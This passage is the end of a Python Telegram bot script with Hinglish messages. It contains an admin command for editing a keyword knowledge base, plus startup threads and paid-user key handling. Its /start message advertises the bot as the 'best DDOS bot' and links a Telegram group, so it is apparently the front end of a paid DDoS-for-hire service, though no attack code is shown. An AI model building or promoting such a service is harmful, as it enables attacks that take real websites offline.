    personality_intro = f"{random.choice(THINKING_LINES)}\n{random.choice(FEELING_LINES)}\n{random.choice(GRATITUDE_LINES)}\n"
    
    if action == "add" and len(cmd_parts) >= 4:
        category, key, value = cmd_parts[1], cmd_parts[2], " ".join(cmd_parts[3:])
        knowledge_base[category][key] = value
        save_knowledge_base()
        if category == "illegal":
            illegal_keywords.add(key)
        bot.reply_to(message, f"{personality_intro}✅ **Gyaan add kiya overlord ji:** {key} -> {value} ({category})! 🚀")
    
    elif action == "delete" and len(cmd_parts) >= 3:
        category, key = cmd_parts[1], cmd_parts[2]
        if key in knowledge_base[category]:
            del knowledge_base[category][key]
            save_knowledge_base()
            bot.reply_to(message, f"{personality_intro}🗑️ **Gyaan delete kiya overlord ji:** {key} ({category})! 💪")
        else:
            bot.reply_to(message, f"{personality_intro}❌ **Yeh gyaan nahi mila overlord ji:** {key} ({category})! 🤔")
    
    else:
        bot.reply_to(message, f"{personality_intro}❓ **Overlord ji, samajh nahi aaya!** 🤔\n**Usage:** `/overlord_cmd add <category> <key> <value>` ya `/overlord_cmd delete <category> <key>`")

# Start Command Handler 🌟
@bot.message_handler(commands=['start'])
def welcome_start(message: telebot.types.Message) -> None:
    user_name = message.from_user.first_name
    response = f"""🌟🔥 **Bhai, Welcome!** 🔥🌟

🚀 **Tu ab Power ke Ghar mein hai!**  
💥 **Duniya ka sabse Best DDOS Bot!** 🔥  
⚡ **King ban, Web pe Raj kar!**  

🔗 **Bot use karne ke liye abhi join kar:**  
👉 [Telegram Group](https://t.me/DDOS_SERVER69) 🚀🔥"""
    bot.reply_to(message, response, parse_mode="Markdown")

# Initialize Everything 🚀
create_files_if_not_exist()
load_users()
load_paid_users()
load_paid_users_expiry()
load_overlord_creations()
load_knowledge_base()
load_predictions()

# Start Threads 🧵
threading.Thread(target=auto_collect_knowledge, daemon=True, name="auto_collect_knowledge").start()
threading.Thread(target=ai_self_evolve, daemon=True, name="ai_self_evolve").start()
threading.Thread(target=ai_health_monitor, daemon=True, name="ai_health_monitor").start()
threading.Thread(target=key_expiry_monitor, daemon=True, name="key_expiry_monitor").start()

# Start Bot Polling 🤖
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logger.error(f"🚨 Bot polling mein error: {e}")
        time.sleep(15)